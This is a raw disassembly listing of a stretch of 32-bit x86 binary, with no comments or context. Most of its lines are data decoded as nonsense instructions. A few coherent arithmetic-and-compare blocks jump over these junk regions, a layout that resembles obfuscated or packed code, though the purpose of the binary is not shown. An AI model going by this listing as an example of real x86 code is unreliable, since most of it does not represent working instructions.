  40b866:	adc    edx,DWORD PTR [ecx+ecx*4+0x46728737]
  40b86d:	adc    al,0xca
  40b86f:	in     al,0xd2
  40b871:	icebp  
  40b872:	clc    
  40b873:	or     eax,0x27e8f9ba
  40b878:	retf   
  40b879:	mov    eax,0xdd008321
  40b87e:	jle    0x40b887
  40b880:	sub    DWORD PTR [esi+0x78],edx
  40b883:	mov    eax,0xb489e1a6
  40b888:	outs   dx,DWORD PTR ds:[esi]
  40b889:	out    0x27,eax
  40b88b:	ss mov bl,0x70
  40b88e:	add    DWORD PTR [edx-0x41],eax
  40b891:	into   
  40b892:	sbb    DWORD PTR [edx+0x7ca5bcd9],ebp
  40b898:	ins    BYTE PTR es:[edi],dx
  40b899:	pop    ecx
  40b89a:	ss std 
  40b89c:	loope  0x40b8f6
  40b89e:	sub    bh,BYTE PTR [edx+0xb]
  40b8a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b8a2:	imul   ecx,eax,0x3ea3b444
  40b8a8:	cmp    al,0x18
  40b8aa:	xor    dl,cl
  40b8ac:	js     0x40b8ab
  40b8ae:	enter  0xda5f,0xc0
  40b8b2:	mov    bh,0x9b
  40b8b4:	inc    DWORD PTR [ecx]
  40b8b6:	mov    ecx,0xe8a85cc0
  40b8bb:	aad    0xaf
  40b8bd:	inc    edx
  40b8be:	sub    edi,DWORD PTR [eax-0x5f6a9c27]
  40b8c4:	repz pop esp
  40b8c6:	mov    DWORD PTR [ebp-0x1e],edx
  40b8c9:	icebp  
  40b8ca:	jne    0x40b92f
  40b8cc:	jp     0x40b8d2
  40b8ce:	mov    bh,0x12
  40b8d0:	inc    ecx
  40b8d1:	jns    0x40b8ca
  40b8d3:	add    eax,0x2dec17
  40b8d8:	mov    ebp,DWORD PTR [ecx+0x67db0fff]
  40b8de:	lds    ebx,FWORD PTR [edi-0x14]
  40b8e1:	in     eax,dx
  40b8e2:	jb     0x40b8e3
  40b8e4:	push   eax
  40b8e5:	shl    dh,0x3e
  40b8e8:	mov    ecx,0x812d4ae4
  40b8ed:	dec    ecx
  40b8ee:	ds pop es
  40b8f0:	repz add dh,BYTE PTR [edx]
  40b8f3:	jne    0x40b8f3
  40b8f5:	push   esp
  40b8f6:	es jg  0x40b8b0
  40b8f9:	mov    edi,0x7d8b950d
  40b8fe:	cld    
  40b8ff:	xor    edx,eax
  40b901:	xor    edi,eax
  40b903:	add    edi,ecx
  40b905:	add    edx,ecx
  40b907:	imul   edx,edi
  40b90a:	mov    edi,DWORD PTR [ebp-0x8]
  40b90d:	mov    ebx,DWORD PTR [ebp-0x10]
  40b910:	sub    ebx,edi
  40b912:	cmp    ebx,edx
  40b914:	ja     0x40b922
  40b91a:	mov    edx,DWORD PTR [ebp-0x30]
  40b91d:	jmp    0x40c0ee
  40b922:	mov    edx,DWORD PTR [ebp-0x38]
  40b925:	mov    edi,DWORD PTR [ebp-0x4]
  40b928:	xor    edx,eax
  40b92a:	xor    edi,eax
  40b92c:	add    edi,ecx
  40b92e:	add    edx,ecx
  40b930:	imul   edx,edi
  40b933:	mov    edi,DWORD PTR [ebp-0x8]
  40b936:	jmp    0x40bcf4
  40b93b:	xchg   ebp,eax
  40b93c:	fcomi  st,st(6)
  40b93e:	push   esi
  40b93f:	jb     0x40b992
  40b941:	mov    ch,0xdb
  40b943:	shl    BYTE PTR [ebx-0x1a789905],cl
  40b949:	sahf   
  40b94a:	pop    edx
  40b94b:	pusha  
  40b94c:	xor    DWORD PTR [eax+0x70],0xffffff9f
  40b950:	jge    0x40b9c2
  40b952:	jo     0x40b8f7
  40b954:	lock test eax,0xba5a4a81
  40b95a:	xor    bl,BYTE PTR [edx-0x5d]
  40b95d:	xchg   ecx,eax
  40b95e:	mov    esp,0x27d75a58
  40b963:	in     eax,0xe1
  40b965:	push   cs
  40b966:	push   ecx
  40b967:	xchg   esp,eax
  40b968:	mov    WORD PTR [ecx-0x76],gs
  40b96b:	(bad)  
  40b96c:	std    
  40b96d:	xchg   esi,eax
  40b96e:	repz pop ebp
  40b970:	ins    DWORD PTR es:[edi],dx
  40b971:	mov    ch,0x6d
  40b973:	fistp  DWORD PTR [ebp-0x3b]
  40b976:	push   ds
  40b977:	(bad)
  40b97b:	loope  0x40b9b3
  40b97d:	jae    0x40b9d9
  40b97f:	sub    BYTE PTR [edx+eiz*2+0x4591cd66],bh
  40b986:	push   esp
  40b987:	mov    ebx,0xf736f876
  40b98c:	and    ebx,DWORD PTR [ebp-0x1f]
  40b98f:	xchg   edi,eax
  40b990:	pop    ecx
  40b991:	inc    esi
  40b992:	shl    DWORD PTR [ebp+0x9cbce41],cl
  40b998:	jmp    0xceef180e
  40b99d:	push   ds
  40b99e:	adc    ch,al
  40b9a0:	daa    
  40b9a1:	adc    DWORD PTR [edx+0x26fd80e3],ecx
  40b9a7:	loop   0x40ba09
  40b9a9:	into   
  40b9aa:	xchg   edi,eax
  40b9ab:	retf   
  40b9ac:	push   eax
  40b9ad:	or     ecx,eax
  40b9af:	stc    
  40b9b0:	add    ah,BYTE PTR [edi+0x6aba0a85]
  40b9b6:	fsubr  QWORD PTR [ebx+0x20]
  40b9b9:	jg     0x40b9f2
  40b9bb:	into   
  40b9bc:	add    DWORD PTR [edx+0x789c086f],0x8e5b02a2
  40b9c6:	push   ds
  40b9c7:	ins    DWORD PTR es:[edi],dx
  40b9c8:	xor    al,0xf3
  40b9ca:	sbb    DWORD PTR [ebx+0x46],ebx
  40b9cd:	iret   
  40b9ce:	add    al,0xb5
  40b9d0:	jb     0x40b983
  40b9d2:	cmp    esi,ecx
  40b9d4:	sub    BYTE PTR [ecx+esi*8+0x554b5ec6],al
  40b9db:	es pop ecx
  40b9dd:	or     esi,DWORD PTR [ebp+0x326371ae]
  40b9e3:	dec    esi
  40b9e4:	xchg   DWORD PTR [ecx-0x77],ecx
  40b9e7:	adc    DWORD PTR [ecx-0x5b],0xf4094c02
  40b9ee:	ud0    ecx,DWORD PTR [esi+0x77]
  40b9f2:	mov    esi,0xf665d71
  40b9f7:	aas    
  40b9f8:	call   0x82522d2b
  40b9fd:	dec    eax
  40b9fe:	xchg   dh,cl
  40ba00:	daa    
  40ba01:	stc    
  40ba02:	inc    ebp
  40ba03:	mov    dl,0xbc
  40ba05:	jl     0x40ba28
  40ba07:	scas   al,BYTE PTR es:[edi]
  40ba08:	push   edx
  40ba09:	sar    dl,cl
  40ba0b:	mov    ah,0xd3
  40ba0d:	cld    
  40ba0e:	push   edx
  40ba0f:	fsubr  st(6),st
  40ba11:	or     eax,0x74f8c415
  40ba16:	mov    ds:0xb6e9704f,eax
  40ba1b:	dec    edx
  40ba1c:	mov    ss,ebx
  40ba1e:	push   DWORD PTR cs:[eax+0x1c]
  40ba22:	(bad)  
  40ba23:	rol    DWORD PTR [eax-0x7d],1
  40ba26:	cmc    
  40ba27:	lahf   
  40ba28:	mov    WORD PTR [ebx+0x132a323],es
  40ba2e:	iret   
  40ba2f:	mov    ah,0xff
  40ba31:	pusha  
  40ba32:	xor    al,0xbb
  40ba34:	cmp    al,0x27
  40ba36:	ja     0x40ba15
  40ba38:	xchg   edi,eax
  40ba39:	in     eax,dx
  40ba3a:	rcr    DWORD PTR [ebx+ecx*2-0x3aadd607],1
  40ba41:	(bad)  
  40ba42:	in     al,0xe2
  40ba44:	mov    esp,0x1c44d62a
  40ba49:	add    BYTE PTR [ebp+0x77],0xe0
  40ba4d:	das    
  40ba4e:	clc    
  40ba4f:	jne    0x40ba57
  40ba51:	mov    edx,0x79e07bd2
  40ba56:	push   eax
  40ba57:	test   eax,0x5a1b5804
  40ba5c:	jbe    0x40bab6
  40ba5e:	cmp    DWORD PTR [edx-0x5],esi
  40ba61:	pop    ecx
  40ba62:	cmc    
  40ba63:	add    al,BYTE PTR [ebx-0xf]
  40ba66:	cmp    eax,0x4b315970
  40ba6b:	inc    ebp
  40ba6c:	outs   dx,DWORD PTR ds:[esi]
  40ba6d:	pusha  
  40ba6e:	jns    0x40ba43
  40ba70:	call   0x6c75a867
  40ba75:	dec    edx
  40ba76:	jecxz  0x40baae
  40ba78:	jae    0x40bab6
  40ba7a:	fdivr  st(6),st
  40ba7c:	xor    eax,0xdc476b19
  40ba81:	and    BYTE PTR [edi+ecx*1],al
  40ba84:	lods   al,BYTE PTR ds:[esi]
  40ba85:	mov    ah,0x81
  40ba87:	adc    eax,0x8b17fbab
  40ba8c:	cmp    DWORD PTR [eax-0x2b364fd5],ecx
  40ba92:	ins    DWORD PTR es:[edi],dx
  40ba93:	adc    al,0xcc
  40ba95:	stos   BYTE PTR es:[edi],al
  40ba96:	jmp    0x40ba59
  40ba98:	jl     0x40baaf
  40ba9a:	xchg   ebp,eax
  40ba9b:	jmp    0x9d7d:0xa29e2e65
  40baa2:	(bad)
  40baa6:	xchg   ecx,eax
  40baa7:	or     bl,BYTE PTR [ecx-0x3e]
  40baaa:	imul   eax,DWORD PTR [edi],0x16b53212
  40bab0:	mov    edi,0xba55b9a5
  40bab5:	jbe    0x40bb2c
  40bab7:	clc    
  40bab8:	sar    DWORD PTR [esp+edx*4-0x46],cl
  40babc:	inc    ebp
  40babd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40babe:	repnz pop esp
  40bac0:	mov    bh,0x5b
  40bac2:	sub    esi,DWORD PTR ds:0xfc152b29
  40bac8:	cmp    BYTE PTR [edi-0x49],ah
  40bacb:	and    eax,0x1da0e792
  40bad0:	dec    esp
  40bad1:	shr    DWORD PTR [eax],1
  40bad3:	dec    ebx
  40bad4:	mov    ecx,0x8db5960b
  40bad9:	out    0x26,al
  40badb:	push   ebp
  40badc:	imul   ecx,eax,0x6a
  40badf:	push   es
  40bae0:	pop    edi
  40bae1:	aam    0xae
  40bae3:	lods   al,BYTE PTR ds:[esi]
  40bae4:	sub    al,BYTE PTR [eax-0x52]
  40bae7:	loope  0x40ba95
  40bae9:	jge    0x40bb05
  40baeb:	pop    ds
  40baec:	(bad)  
  40baed:	xchg   ebp,eax
  40baee:	xchg   edi,eax
  40baef:	xor    bl,BYTE PTR [edi-0x43]
  40baf2:	jl     0x40baeb
  40baf4:	outs   dx,DWORD PTR ds:[esi]
  40baf5:	sbb    eax,0x714a3103
  40bafa:	sub    bh,bl
  40bafc:	imul   DWORD PTR [edi-0x628d9398]
  40bb02:	int    0x5b
  40bb04:	or     BYTE PTR [ebx+0x6a095653],0xaa
  40bb0b:	jmp    0x40baf5
  40bb0d:	(bad)  [eax+0x24c81017]
  40bb13:	mov    edi,0x7f1ed9af
  40bb18:	pop    ebp
  40bb19:	ret    
  40bb1a:	dec    esp
  40bb1b:	push   edx
  40bb1c:	retf   
  40bb1d:	xor    DWORD PTR [eax],eax
  40bb1f:	push   eax
  40bb20:	dec    ebx
  40bb21:	je     0x40bb4b
  40bb23:	(bad)  
  40bb25:	inc    eax
  40bb26:	mov    ecx,0xd929f707
  40bb2b:	xchg   DWORD PTR [edi],eax
  40bb2d:	rol    BYTE PTR ss:[ecx],cl
  40bb30:	ret    0x7744
  40bb33:	sar    ecx,1
  40bb35:	iret   
  40bb36:	sub    ecx,DWORD PTR [ebx-0x14]
  40bb39:	jp     0x40bb1d
  40bb3b:	push   eax
  40bb3c:	popf   
  40bb3d:	in     eax,0x24
  40bb3f:	sub    al,0x83
  40bb41:	mov    ecx,0xaf355bd6
  40bb46:	adc    al,0x85
  40bb48:	and    DWORD PTR [edi+0x6c7e3b13],eax
  40bb4e:	mov    dl,0x51
  40bb50:	adc    dl,0xfc
  40bb53:	and    eax,0x309960e0
  40bb58:	je     0x40bae2
  40bb5a:	mov    eax,ds:0x84784d64
  40bb5f:	sbb    edi,DWORD PTR [ebp*4+0x206eaf24]
  40bb66:	sbb    BYTE PTR [ecx-0x4a],bl
  40bb69:	retf   0x75d8
  40bb6c:	push   esi
  40bb6d:	mov    al,ds:0x51bd7239
  40bb72:	add    bl,BYTE PTR [ebx]
  40bb74:	push   0xffffffda
  40bb76:	adc    dl,BYTE PTR es:[ebp+0x5e]
  40bb7a:	mov    DWORD PTR [esi],eax
  40bb7c:	push   cs
  40bb7d:	cmp    edi,DWORD PTR [edi]
  40bb7f:	jne    0x40bbb4
  40bb81:	aaa    
  40bb82:	pop    ecx
  40bb83:	fwait
  40bb84:	push   ecx
  40bb85:	cmp    BYTE PTR [eax+0x2b73ac5a],dl
  40bb8b:	fdivr  DWORD PTR [ebp-0x4f]
  40bb8e:	dec    ebp
  40bb8f:	int    0x57
  40bb91:	ds pop ecx
  40bb93:	pop    es
  40bb94:	pop    edx
  40bb95:	(bad)  [edi-0x120eab41]
  40bb9b:	mov    DWORD PTR [edx],esi
  40bb9d:	mov    cl,0x57
  40bb9f:	sub    BYTE PTR [ebx],ch
  40bba1:	lock stc 
  40bba3:	fld    QWORD PTR [ecx]
  40bba5:	mov    esp,0x9fea507b
  40bbaa:	jp     0x40bbca
  40bbac:	inc    ebx
  40bbad:	loopne 0x40bbcf
  40bbaf:	jae    0x40bbd0
  40bbb1:	or     esi,DWORD PTR [ebx-0x6a66a608]
  40bbb7:	test   BYTE PTR [esi+0x43],0xfa
  40bbbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bbbc:	cmp    BYTE PTR [ebp+ecx*8+0x72],0xcb
  40bbc1:	mov    bh,0xf6
  40bbc3:	add    al,0xb9
  40bbc5:	or     ah,ah
  40bbc7:	dec    esp
  40bbc8:	add    eax,0x40999fa8
  40bbcd:	ss sbb al,0xef
  40bbd0:	loop   0x40bc28
  40bbd2:	jmp    0x40bbbd
  40bbd4:	cs pushf 
  40bbd6:	pop    ebp
  40bbd7:	jle    0x40bb6e
  40bbd9:	sub    al,0xac
  40bbdb:	dec    esp
  40bbdc:	sub    dh,bl
  40bbde:	mov    cs,WORD PTR [esi+ebx*1]
  40bbe1:	les    esi,FWORD PTR [edx-0x68]
  40bbe4:	jmp    0x40bbf7
  40bbe6:	stos   DWORD PTR es:[edi],eax
  40bbe7:	mov    esp,0x61c9f0ee
  40bbec:	ror    BYTE PTR [ecx],0xe3
  40bbef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bbf0:	mov    ah,0x6c
  40bbf3:	xor    bh,dl
  40bbf5:	adc    dl,BYTE PTR [esi+0x6a]
  40bbf8:	push   cs
  40bbf9:	fcomip st,st(4)
  40bbfb:	sub    eax,0xdbe6681a
  40bc00:	aam    0x42
  40bc02:	xor    eax,0x74307310
  40bc07:	dec    esp
  40bc08:	in     al,dx
  40bc09:	(bad)  
  40bc0a:	loopne 0x40bbf7
  40bc0c:	sub    esp,0x81685b78
  40bc12:	pop    eax
  40bc13:	sbb    dh,0xc6
  40bc16:	jmp    0x59c0:0x95d7dccd
  40bc1d:	mov    ss,WORD PTR [esi-0x2dd0e46]
  40bc23:	cmp    al,0x69
  40bc25:	xchg   cl,ch
  40bc27:	in     al,0x96
  40bc29:	lods   al,BYTE PTR ds:[esi]
  40bc2a:	mov    dl,0x6d
  40bc2c:	xor    al,0xe9
  40bc2e:	or     ebx,DWORD PTR cs:[ebp*8+0x730ba238]
  40bc36:	ficom  DWORD PTR [ebx-0xdb9bffb]
  40bc3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc3d:	cwde   
  40bc3e:	lea    esp,[edx+0x15]
  40bc41:	jmp    0x40bcac
  40bc43:	dec    edx
  40bc44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc45:	jae    0x40bbd5
  40bc47:	jmp    0x630e3c57
  40bc4c:	push   0xffffff9e
  40bc4e:	push   ss
  40bc4f:	lahf   
  40bc50:	pop    edi
  40bc51:	xchg   edi,eax
  40bc52:	repnz rcr BYTE PTR [edi+0x2fe8fc99],cl
  40bc59:	mov    al,ds:0xea8a90a1
  40bc5e:	(bad)  
  40bc5f:	bound  eax,QWORD PTR ds:0x5be66f79
  40bc65:	mov    ebp,ebp
  40bc67:	leave  
  40bc68:	shr    DWORD PTR [esp+eax*2-0xd],1
  40bc6c:	dec    ecx
  40bc6d:	in     al,0x5b
  40bc6f:	cmp    DWORD PTR [edx+0x30],esp
  40bc72:	pop    edx
  40bc73:	dec    eax
  40bc74:	fstp   QWORD PTR [ecx-0x45aaf83e]
  40bc7a:	adc    BYTE PTR [edx+0x3d],bl
  40bc7d:	xchg   ch,ch
  40bc7f:	data16 stos BYTE PTR es:[edi],al
  40bc81:	mov    bl,0x59
  40bc83:	and    DWORD PTR [edx-0x29],eax
  40bc86:	adc    eax,0x44a26b3c
  40bc8b:	mov    eax,gs:0x3565463b
  40bc91:	sbb    dl,cl
  40bc93:	sub    al,0xe5
  40bc95:	lea    esi,[esi]
  40bc97:	jge    0x40bc46
  40bc99:	fnstcw WORD PTR [esi+0x44]
  40bc9c:	dec    ecx
  40bc9d:	mov    ebx,0x300de912
  40bca2:	push   ss
  40bca3:	imul   ebx,DWORD PTR [eax],0x8ac5b273
  40bca9:	jae    0x40bc53
  40bcab:	xor    DWORD PTR [edx-0x5a],ecx
  40bcae:	and    dh,BYTE PTR ds:[ebp-0x1e]
  40bcb2:	aas    
  40bcb3:	xchg   BYTE PTR [ecx+0x5a],ah
  40bcb6:	cmc    
  40bcb7:	fsub   st(4),st
  40bcb9:	push   eax
  40bcba:	fimul  WORD PTR ds:0xdcebe207
  40bcc0:	pop    eax
  40bcc1:	jl     0x40bcba
  40bcc3:	mov    BYTE PTR [esi],bh
  40bcc5:	int3   
  40bcc6:	push   esp
  40bcc7:	enter  0x29ad,0x60
  40bccb:	or     DWORD PTR [esi-0x5f],ecx
  40bcce:	jne    0x40bc54
  40bcd0:	xchg   edx,eax
  40bcd1:	addr16 jmp 0x40bd00
  40bcd4:	mov    esi,0xeded51a9
  40bcd9:	cmp    ah,BYTE PTR [edi+0x206f6ac0]
  40bcdf:	xor    DWORD PTR es:[esi],esi
  40bce2:	imul   eax,DWORD PTR ds:0x22126b33,0x7ec12a53
  40bcec:	out    dx,al
  40bced:	ds pop ebp
  40bcef:	sbb    edi,ebp
  40bcf1:	mov    edi,0x5d8bd23c
  40bcf6:	lock sub ebx,edi
  40bcf9:	cmp    ebx,edx
  40bcfb:	ja     0x40bd09
  40bd01:	mov    edx,DWORD PTR [ebp-0x34]
  40bd04:	jmp    0x40c0ee
  40bd09:	mov    edx,DWORD PTR [ebp-0x3c]
  40bd0c:	mov    edi,DWORD PTR [ebp-0x4]
  40bd0f:	xor    edx,eax
  40bd11:	xor    edi,eax
  40bd13:	add    edx,ecx
  40bd15:	add    edi,ecx
  40bd17:	imul   edx,edi
  40bd1a:	mov    edi,DWORD PTR [ebp-0x8]
  40bd1d:	mov    ebx,DWORD PTR [ebp-0x10]
  40bd20:	sub    ebx,edi
  40bd22:	cmp    ebx,edx
  40bd24:	mov    edx,DWORD PTR [ebp-0x38]
  40bd27:	jbe    0x40c0ee
  40bd2d:	jmp    0x40c0eb
  40bd32:	xchg   edx,eax
  40bd33:	dec    edx
  40bd34:	inc    edx
  40bd35:	inc    esp
  40bd36:	inc    edx
  40bd37:	push   esp
  40bd38:	xchg   edx,eax
  40bd39:	dec    edx
  40bd3a:	fdiv   DWORD PTR [edx+edi*8]
  40bd3d:	adc    cl,BYTE PTR [ebx]
  40bd3f:	lods   al,BYTE PTR ds:[esi]
  40bd40:	shl    DWORD PTR [edi+ecx*4-0x608f8f71],cl
  40bd47:	jge    0x40bdb9
  40bd49:	jo     0x40bd7d
  40bd4b:	sti    
  40bd4c:	mov    ah,0xd1
  40bd4e:	js     0x40bd14
  40bd50:	in     al,0x22
  40bd52:	jge    0x40bd44
  40bd54:	dec    ecx
  40bd55:	mov    ds:0xff529eca,al
  40bd5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd5b:	sbb    BYTE PTR [ecx-0x1e],ch
  40bd5e:	fstp   TBYTE PTR [edx+0x434349c2]
  40bd64:	mov    DWORD PTR [ecx],eax
  40bd66:	aam    0x6a
  40bd68:	mov    ds:0x508cd635,al
  40bd6d:	or     esp,DWORD PTR [ecx+0x738f61f8]
  40bd73:	jbe    0x40bd80
  40bd75:	push   esp
  40bd76:	sub    ecx,DWORD PTR [ecx+0x701e8e88]
  40bd7c:	clc    
  40bd7d:	or     ecx,DWORD PTR [ecx]
  40bd7f:	xchg   esi,eax
  40bd80:	lods   al,BYTE PTR ds:[esi]
  40bd81:	adc    esp,DWORD PTR [edx-0x21]
  40bd84:	sub    eax,0x79fee090
  40bd89:	(bad)  
  40bd8a:	cmp    BYTE PTR [edi],bl
  40bd8c:	xor    DWORD PTR [esi+edx*1-0x5bc3ea18],ebp
  40bd93:	inc    ecx
  40bd94:	adc    bl,BYTE PTR [esi]
  40bd96:	jne    0x40bd86
  40bd98:	aas    
  40bd99:	addr16 mov al,ds:0x5a90
  40bd9d:	mov    esp,0xd4d3d312
  40bda2:	clc    
  40bda3:	popa   
  40bda4:	shr    BYTE PTR [edi+0x1651fc7],cl
  40bdaa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bdab:	lods   al,BYTE PTR ds:[esi]
  40bdac:	test   ebx,edx
  40bdae:	xchg   esi,eax
  40bdaf:	and    eax,0xc0c17b4f
  40bdb4:	imul   edx,DWORD PTR [ecx+0x10],0xeabcdff5
  40bdbb:	xor    eax,0x79539a7c
  40bdc0:	sub    eax,0x54000b7f
  40bdc5:	dec    edx
  40bdc6:	hlt    
  40bdc7:	(bad)  
  40bdc8:	sahf   
  40bdc9:	push   esp
  40bdca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bdcb:	sar    BYTE PTR [ebp+0xb247f31],cl
  40bdd1:	in     eax,dx
  40bdd2:	jo     0x40bdbe
  40bdd4:	enter  0x97cb,0x79
  40bdd8:	and    DWORD PTR [edi-0x6dece438],ebp
  40bdde:	nop
  40bddf:	out    dx,eax
  40bde0:	(bad)  
  40bde1:	dec    eax
  40bde2:	inc    ebx
  40bde3:	popf   
  40bde4:	xlat   BYTE PTR ds:[ebx]
  40bde5:	stos   BYTE PTR es:[edi],al
  40bde6:	jmp    0x40be2d
  40bde8:	out    0xc1,eax
  40bdea:	addr16 xchg edi,eax
  40bdec:	adc    dl,ah
  40bdee:	xchg   edi,eax
  40bdef:	clc    
  40bdf0:	(bad)  
  40bdf1:	arpl   WORD PTR [eax-0x6e],cx
  40bdf4:	jb     0x40be1b
  40bdf6:	adc    eax,ecx
  40bdf8:	out    dx,eax
  40bdf9:	mov    edi,0xb0316cf6
  40bdfe:	mul    DWORD PTR cs:[edi+0x25]
  40be02:	jg     0x40bdc6
  40be04:	das    
  40be05:	sahf   
  40be06:	fwait
  40be07:	mov    bl,0xa0
  40be09:	sbb    BYTE PTR [ebp+0x5f],0x4
  40be0d:	cli    
  40be0e:	pushf  
  40be0f:	xor    ebx,esp
  40be11:	sub    eax,0xe6793513
  40be16:	add    al,0x11
  40be18:	mov    al,ds:0x8c5a10ff
  40be1d:	push   esi
  40be1e:	fldenv [ecx+0x75]
  40be21:	test   al,0xb6
  40be23:	pop    ss
  40be24:	cdq    
  40be25:	outs   dx,DWORD PTR ds:[esi]
  40be26:	lea    ebx,[ebp+0x6]
  40be29:	jl     0x40be1d
  40be2b:	stc    
  40be2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be2d:	cmp    eax,0xaafaac01
  40be32:	loopne 0x40bdff
  40be34:	dec    ebx
  40be35:	jge    0x40bdc6
  40be37:	sahf   
  40be38:	push   esp
  40be39:	enter  0x7557,0x54
  40be3d:	push   ebp
  40be3e:	and    BYTE PTR [edx+edi*4-0x52],ch
  40be42:	in     al,0x8
  40be44:	dec    ebp
  40be45:	cli    
  40be46:	call   0x2674:0xcad8295a
  40be4d:	or     BYTE PTR [ecx],bh
  40be4f:	aas    
  40be50:	mov    ecx,0xb2babf01
  40be55:	mov    dh,0x26
  40be57:	dec    ebp
  40be58:	fmul   QWORD PTR [edx]
  40be5a:	aas    
  40be5b:	fcmovnu st,st(7)
  40be5d:	out    dx,eax
  40be5e:	cdq    
  40be5f:	push   ebp
  40be60:	add    DWORD PTR [ecx+0x4ad9481f],edi
  40be66:	push   edx
  40be67:	jl     0x40be37
  40be69:	sbb    bl,BYTE PTR [esi]
  40be6b:	fst    DWORD PTR ds:0xe0cd8605
  40be71:	mov    edx,fs
  40be73:	mov    ebx,0x77d3b5eb
  40be78:	xchg   edi,eax
  40be79:	pushf  
  40be7a:	std    
  40be7b:	leave  
  40be7c:	sub    eax,0x45433438
  40be81:	push   ds
  40be82:	and    BYTE PTR [ebx+0x2e],0xd8
  40be86:	add    dh,BYTE PTR [ecx-0x2858d598]
  40be8c:	or     eax,0xcfd0a25b
  40be91:	(bad)  
  40be92:	mov    ebp,0x1f1a427a
  40be97:	popf   
  40be98:	jae    0x40be4b
  40be9a:	stos   DWORD PTR es:[edi],eax
  40be9b:	jbe    0x40bf07
  40be9d:	mov    ecx,0xe3eafd19
  40bea2:	out    dx,eax
  40bea3:	imul   edi,esi,0x63
  40bea6:	fsubp  st(5),st
  40bea8:	jp     0x40be75
  40beaa:	xchg   BYTE PTR [ecx],ah
  40beac:	aas    
  40bead:	sbb    BYTE PTR [ecx],dh
  40beaf:	enter  0x3373,0xd2
  40beb3:	mov    bl,0x20
  40beb5:	ins    BYTE PTR es:[edi],dx
  40beb6:	cwde   
  40beb7:	neg    DWORD PTR [ecx+0x3f08ea28]
  40bebd:	outs   dx,BYTE PTR ds:[esi]
  40bebe:	mov    bl,0x27
  40bec0:	loopne 0x40be70
  40bec2:	neg    BYTE PTR [edx]
  40bec4:	call   0x75f9:0x7d889b4
  40becb:	mov    cs,WORD PTR [edx+eiz*1+0x25]
  40becf:	ins    BYTE PTR es:[edi],dx
  40bed0:	cmp    DWORD PTR [ebp-0x30a641a0],esi
  40bed6:	mov    ah,0x8d
  40bed8:	je     0x40bf04
  40beda:	mov    eax,0x2e5029ce
  40bedf:	mov    dh,0x1b
  40bee1:	daa    
  40bee2:	sbb    esi,ebp
  40bee4:	or     ebp,DWORD PTR [ecx+0x1778259b]
  40beea:	sar    cl,1
  40beec:	jae    0x40be9a
  40beee:	push   es
  40beef:	cdq    
  40bef0:	daa    
  40bef1:	jmp    0xee54:0xc94fc3d5
  40bef8:	test   eax,0xf6cece0
  40befd:	add    edi,edx
  40beff:	push   ds
  40bf00:	lds    ebp,FWORD PTR [edi]
  40bf02:	push   ebx
  40bf03:	dec    esp
  40bf04:	pusha  
  40bf05:	sti    
  40bf06:	popf   
  40bf07:	loope  0x40bea0
  40bf09:	sbb    BYTE PTR [ebx],0x7c
  40bf0c:	fs inc esp
  40bf0e:	clc    
  40bf0f:	jl     0x40bf7b
  40bf11:	sbb    esp,DWORD PTR [ecx+0x36]
  40bf14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf15:	pop    ebx
  40bf16:	es es lock cs fs imul ebp,edi,0xc32835b6
  40bf21:	dec    eax
  40bf22:	sbb    eax,ebp
  40bf24:	sbb    edi,ebp
  40bf26:	in     eax,0x3b
  40bf28:	and    ebx,edx
  40bf2a:	push   ecx
  40bf2b:	jne    0x40bf4f
  40bf2d:	repz cmp eax,0x91d77d03
  40bf33:	sub    eax,0xd237699f
  40bf38:	imul   esi,esp,0x7bf8a73e
  40bf3e:	mov    eax,0x4cf74fbf
  40bf43:	call   0x9096674a
  40bf48:	ins    BYTE PTR es:[edi],dx
  40bf49:	lds    eax,FWORD PTR [ebx]
  40bf4b:	scas   eax,DWORD PTR es:[edi]
  40bf4c:	xlat   BYTE PTR ds:[ebx]
  40bf4d:	sub    BYTE PTR [ecx-0x53],bl
  40bf50:	dec    esi
  40bf51:	imul   edi,DWORD PTR [ebp+esi*1-0x64],0x307d849a
  40bf59:	mov    DWORD PTR [edx+0x22aa0227],ebx
  40bf5f:	inc    ebx
  40bf60:	pop    ds
  40bf61:	mov    dl,0x1d
  40bf63:	dec    edi
  40bf64:	jo     0x40bfdf
  40bf66:	addr16 in al,0xf9
  40bf69:	mov    ah,0xb3
  40bf6b:	lds    edx,FWORD PTR [ebx-0x7ca2f492]
  40bf71:	cmp    al,0x61
  40bf73:	xchg   DWORD PTR [edi],ebp
  40bf75:	pusha  
  40bf76:	xchg   edx,eax
  40bf77:	sbb    DWORD PTR [ebx],eax
  40bf79:	lds    ebx,FWORD PTR [edi]
  40bf7b:	cmp    al,0xc
  40bf7d:	retf   0xfbd6
  40bf80:	arpl   WORD PTR [edx],sp
  40bf82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bf83:	bound  eax,QWORD PTR [ebx]
  40bf85:	mov    bl,BYTE PTR cs:[ebx]
  40bf88:	cmp    DWORD PTR [esi+0xd],ebp
  40bf8b:	retf   0x28c0
  40bf8e:	shr    edi,cl
  40bf90:	xor    BYTE PTR [edi-0x22],cl
  40bf93:	sti    
  40bf94:	sub    cl,0x2c
  40bf97:	sbb    al,0xb9
  40bf99:	scas   eax,DWORD PTR es:[edi]
  40bf9a:	(bad)  
  40bf9b:	stc    
  40bf9c:	sahf   
  40bf9d:	ret    
  40bf9e:	cmp    BYTE PTR [edx+0x1556651a],al
  40bfa4:	mov    fs,esi
  40bfa6:	ja     0x40bfb0
  40bfa8:	gs cdq 
  40bfaa:	inc    eax
  40bfab:	lods   eax,DWORD PTR ds:[esi]
  40bfac:	out    0x7d,al
  40bfae:	pop    esp
  40bfaf:	adc    al,0xf5
  40bfb1:	lahf   
  40bfb2:	ficomp DWORD PTR [ebx]
  40bfb4:	imul   ebp,DWORD PTR [ebp+0x12],0xff722536
  40bfbb:	jl     0x40bf42
  40bfbd:	cdq    
  40bfbe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
